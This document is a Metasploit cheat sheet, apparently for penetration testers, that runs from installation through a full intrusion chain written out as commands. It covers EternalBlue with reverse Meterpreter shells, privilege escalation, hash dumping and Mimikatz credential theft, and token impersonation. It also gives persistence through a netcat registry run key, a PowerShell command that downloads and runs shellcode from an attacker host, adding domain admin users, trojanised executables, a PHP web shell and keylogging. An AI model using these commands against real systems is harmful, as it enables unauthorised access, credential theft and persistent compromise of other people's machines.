Metasploit


# OS X

Download the latest installer and run: http://osx.metasploit.com
Answer yes to all the questions.
sudo chown -R <username> /opt/metasploit-framework/
sudo chown -R <username> /Users/<username>/.msf4/
     If /Users/<username>/.msf4/ does not exit,
          mkdir /Users/<username>/.msf4
          echo test > /Users/<username>/.msf4/database.yml
          sudo chown -R <username> /Users/<username>/.msf4/
/opt/metasploit-framework/bin/msfdb init
/opt/metasploit-framework/bin/msfconsole
Would you like to add msfconsole and other programs to your default PATH? yes

msf > db_status 
[*] postgresql connected to msf
msf > db_rebuild_cache 
[*] Purging and rebuilding the module cache in the background...

Wait about 3 min.
msf > search ms17                             Show all Microsoft exploits released in 2017
------------------------------------------------------------------------------------------------------

service postgrsql start                       Start the PostreSQL db
msfconsole                                    Start Metasploit
msf > db_status                               Check that you are connected to the db
------------------------------------------------------------------------------------------------------

# Troubleshooting

- If the db connection fails:
msf > exit
msfdb init
msfconsole
msf > db_status

- If the db connection still fails:
msf > exit

cat /usr/share/metasploit-framework/config/database.yml
Copy the password.

su postgres
createuser msf -P
Enter password for new role:
Enter it again:

psql
CREATE DATABASE msf;
GRANT ALL PRIVILEGES ON DATABASE msf to msf;
ALTER DATABASE msf OWNER TO msf;
\q
exit

service postgresql restart
msfdb init
msfconsole
msf > db_status

- Module database cache not built yet, using slow search
db_rebuild_cache                              Rebuilds the database-stored module cache
------------------------------------------------------------------------------------------------------

help or ?                                     Show available commands and their descriptions
grep -h                                       Show help on the 'grep' command
------------------------------------------------------------------------------------------------------

# Searching

search <string>
search ms17                                   Show all Microsoft exploits released in 2017

grep <string> search <type>
grep php search payloads                      Search all payloads, then grep for php
------------------------------------------------------------------------------------------------------

# Basic usage

show <all, auxilary, encoders, exploits, nops, payloads, plugins, post>
show exploits
search ms17_010

use exploit/windows/smb/ms17_010_eternalblue
show info
set rhost <target IP>
show targets                                  Show OSs that can be targeted with this exploit
show payloads                                 Show all payloads that work with this exploit
set payload windows/x64/meterpreter/reverse_tcp
show options                                  Show remainging options for the payload
set lhost <attacker IP>                       Set the listner to the attacker's IP
set lport <attacker port>                     Set the listening port to 443
exploit                                       Run the exploit

- If the target is Linux: set AutoRunscript post/linux/manage/sshkey_persistence
This lets you automatically establish persistence, without having to think about it.
------------------------------------------------------------------------------------------------------

# Cross platform exploit

- Windows
use exploit/multi/script/web_delivery
set lhost <attacker IP>
set lport <attacker port>
show targets
set target 2                                  Set the target language to PowerShell
set payload windows/meterpreter/reverse_tcp
exploit

- Linux and OS X
use exploit/multi/script/web_delivery
set lhost <attacker IP>
set lport <attacker port>
set target 0                                  Set the target language to Python
set payload python/meterpreter/reverse_tcp
exploit
------------------------------------------------------------------------------------------------------

# Sessions

sessions -h
Usage: sessions [options]

Active session manipulation and interaction.

OPTIONS:

     -K        Terminate all sessions
     -c <opt>  Run a command on the session given with -i, or all
     -h        Help banner
     -i <opt>  Interact with the supplied session ID
     -k <opt>  Terminate sessions by session ID and/or range
     -l        List all active sessions
     -q        Quiet mode
     -r        Reset the ring buffer for the session given with -i, or all
     -s <opt>  Run a script on the session given with -i, or all
     -t <opt>  Set a response timeout (default: 15)
     -u <opt>  Upgrade a shell to a meterpreter session on many platforms
     -v        List sessions in verbose mode
     -x        Show extended information in the session table

Many options allow specifying session ranges using commas and dashes.

For example:
     sessions -s checkvm -i 1,3-5
     sessions -k 1-2,5,6

sessions -l                                   Show active sessions
sessions -i 2                                 Interact with session 2
ctrl z                                        Put the session in the background and go back to the MSF
------------------------------------------------------------------------------------------------------

# Post exploitation - situational awareness

ps                                            Search for a process running as NT AUTHORITY\SYSTEM
migrate <PID>                                 Migrate to a process running as NT AUTHORITY\SYSTEM
sysinfo                                       Gets information about the remote system, such as OS
getuid                                        Get the user that the server is running as
ipconfig                                      Show the target IP
------------------------------------------------------------------------------------------------------

# Escalate privileges

use priv                                      Attempt to elevate to NT AUTHORITY\SYSTEM
background                                    If this fails, background the current session and try options

- Option 1:
getsystem

- Option 2:
use exploit/windows/local/bypassuac
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker IP>
set LPORT 444                                 This MUST be a different port from what was used in the original exploit
exploit

- Option 3:
run post/windows/escalate/getsystem
getuid
getsystem
getuid                                        Privileges should now be NT AUTHORITY\SYSTEM

- Option 4:
use post/windows/escalate/droplnk
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker IP>
set LPORT 444
exploit

- Option 5:
use exploit/windows/local/service_permissions
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker IP>
set LPORT 444
exploit

- Option 6:
use exploit/windows/local/trusted_service_path
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker IP>
set LPORT 444
exploit

- Option 7:
use exploit/windows/local/ppr_flatten_rec
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker IP>
set LPORT 444
exploit

- Option 8:
use exploit/windows/local/ms_ndproxy
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker IP>
set LPORT 444
exploit

- Option 9:
use exploit/windows/local/ask
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker IP>
set LPORT 444
exploit
------------------------------------------------------------------------------------------------------

# Dump hashes

hashdump                                      Try to dump password hashes, if this fails continue
ps                                            Show running processes
migrate <PID>                                 Migrate to a process running as NT AUTHORITY\SYSTEM
hashdump                                      Dump password hashes

run post/windows/gather/credentials/credential_collector
run post/windows/gather/credentials/domain_hashdump
run post/windows/gather/credentials/gpp
------------------------------------------------------------------------------------------------------

# Mimikatz

load kiwi                                     Load Mimikatz
creds_all                                     Retrieve all credentials
creds_kerberos                                Retrieve Kerberos creds
creds_livessp                                 Retrieve LiveSSP creds
creds_msv                                     Retrieve LM/NTLM creds (hashes)
creds_ssp                                     Retrieve SSP creds
creds_tspkg                                   Retrieve TsPkg creds
creds_wdigest                                 Retrieve WDigest creds
golden_ticket_create                          Create a golden kerberos ticket
kerberos_ticket_list                          List all kerberos tickets
kerberos_ticket_purge                         Purge any in-use kerberos tickets
kerberos_ticket_use                           Use a kerberos ticket
lsa_dump                                      Dump LSA secrets
wifi_list                                     List wifi profiles/creds
------------------------------------------------------------------------------------------------------

# Steal tokens to impersonate

getuid
getprivs                                      Gets as many SYSTEM privileges as it can
use incognito
list_tokens -u
list_tokens -g
impersonate_token <domain>\\<user>
impersonate_token "NT AUTHORITY\\SYSTEM"
getuid
------------------------------------------------------------------------------------------------------

# Establish persistence

Option 1:
run persistence -h
run persistence <starts at computer startup> <tries to connect every 30s> <port 443> <attacker IP>
run persistence -X -i 30 -p 443 -r <target IP>
Notice that it shows where the file is stored on the Windows machine.
It also gives you the location of the Meterpreter resource file you can run to remove persistence.

Example:
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker IP>
set LPORT 443
set ExitOnSession false
set AutoRunScript persistence -X -i 30 -p 443 -r <target IP>
exploit -j -z

Option 2 - Add a user:
add_user <user> <password> -h <target IP>
add_group_user "Domain Admins" <user> -h <target IP>

Option 3 - Scheduled:
info exploit/windows/local/s4u_persistence

Notice the trigger methods: event, lock, logon, schedule, unlock

use exploit/windows/local/s4u_persistence
set session 1
set TRIGGER lock
exploit

Option 4 - Volume Shadow Copy:
use exploit/windows/local/vss_persistence
set session 1
set RHOST <target IP>
set LPORT 4445  <———use a different port number
exploit

Option 5 - Upload netcat:
meterpreter > upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32\\

Check for anything the runs at startup.
meterpreter > reg enumkey -k HKLM\\software\\windows\\currentversion\\run

Add a registry key.
meterpreter > reg setval -k HKLM\\software\\windows\\currentversion\\run -v netcat -d ‘c:\windows\system32\nc.exe -ldp 443 -e cmd.exe'

Verify changes to the registry.
meterpreter > reg queryval -k HKLM\\software\\windows\\currentversion\\run -v netcat

Reboot the target system.
meterpreter >  reboot

Connect to target system - option 1:
Open a new Terminal: nc -vn <target IP> 443

Connect to target system - option 2:
use multi/handler
set PAYLOAD windows/shell_bind_tcp
set RHOST <target IP>
exploit
------------------------------------------------------------------------------------------------------

# Windows enumeration

run killav
run getcountermeasure
run winenum
run post/windows/gather/checkvm
run post/windows/gather/enum_applications
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_shares
run post/windows/gather/enum_snmp
run post/windows/gather/usb_history
reg enumkey -k HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
------------------------------------------------------------------------------------------------------

# Upload tools

upload <local path> <remote path>
upload /usr/share/windows-binaries/nc.exe c:\\
------------------------------------------------------------------------------------------------------

# Lateral movement

use windows/smb/psexec
set RHOST <target IP>
set SMBUser <user>
set SMBPass <password or hash>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <local IP>
set LPORT <local port>
exploit

powershell -command "IEX (New-Object Net.WebClient).DownloadString('http://AWS-IP/Powersploit/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -lhost <local IP> -lport <local port> -Force"
------------------------------------------------------------------------------------------------------

# Pivoting

run get_local_subnets                         Get the local subnets
ipconfig                                      Look for dual-homed connections
192.168.0.10
255.255.255.0
 
10.0.0.5
255.255.255.0

run arp_scanner -r 10.10.10.1/24
10.0.0.1
10.0.0.2
10.0.0.5
10.0.0.20

meterpreter > background
route add 10.0.0.1/24 x                       Where x is the meterpreter session ID
route print                                   Verify the new route

use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.0.0/24
set PORTS 445
set THREADS 10
run
------------------------------------------------------------------------------------------------------

# Post exploitation of a domain controller (DC)

- Find all Active Directory users
use post/windows/gather/enum_ad_computers
set filter objectCategory=computer
set session 1
exploit

- Enumerate all logged on users
use post/windows/gather/enum_logged_on_users
set session 1
exploit

- Gather all Groups in Active Directory
use post/windows/gather/enum_ad_groups
set session 1
exploit

- Find all shared folders in Active Directory
use post/windows/gather/enum_shares
set session 1
exploit

- Add any user in Active Directory
use post/windows/manage/add_user_domain
set addtodomain true
set username hacker
set password w00t!
set session 1
exploit

- Delete any  user in Active Directory
use post/windows/manage/delete_user
set username hacker
set session 1
exploit
------------------------------------------------------------------------------------------------------

# msfvenom

msfvenom -p <payload variable=value> -f <format> -a <arch> --platform <OS platform> -o <output file>

Generate a reverse payload and save it as an executable:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.7 LPORT=443 -f exe -a x86_64 —platform windows -o /root/evil64.exe

Generate a bind payload that avoids a bad character:
msfvenom -p windows/meterpreter/bind_tcp -b '\x00'

Generate a bind payload and encode it 3 times:
msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3

Inject a bind payload into calc.exe and save it as an executable: 
msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -k -f exe > calc2.exe

Generate PHP web shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -a php -e php/base64 -f raw -o webshell.php

Upload the file to a web server: /var/www/

use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 10.0.0.5
set LPORT 443
exploit

Access the shell on the remote web server.
firefox http://<tartget IP>/webshell.php
------------------------------------------------------------------------------------------------------

# Database

services -p 22                List specific ports
services -s http              List specific services

workspace                     List workspaces
* default                     * shows the active workspace
  client1
  client5

workspace client1             Switch workspace

workspace                     List workspaces
  default
* client1                     * shows the active workspace
  client5

workspace -a <name>           Add workspace(s)
workspace -d <name>           Delete workspace(s)
workspace -r <old> <new>      Rename workspace
------------------------------------------------------------------------------------------------------

# Misc

idletime                      Returns the number of seconds the remote user has been idle
     If time < 5 min
     keyscan_start            Start capturing keystrokes
     keyscan_stop             Stop capturing keystrokes
     keyscan_dump             Dump the keystroke buffer

screenshot                    Grab a screenshot of the interactive desktop

timestomp                     Manipulate file MACE attributes

run vnc
     If the screen is locked exit VNC
     Run screen_unlock

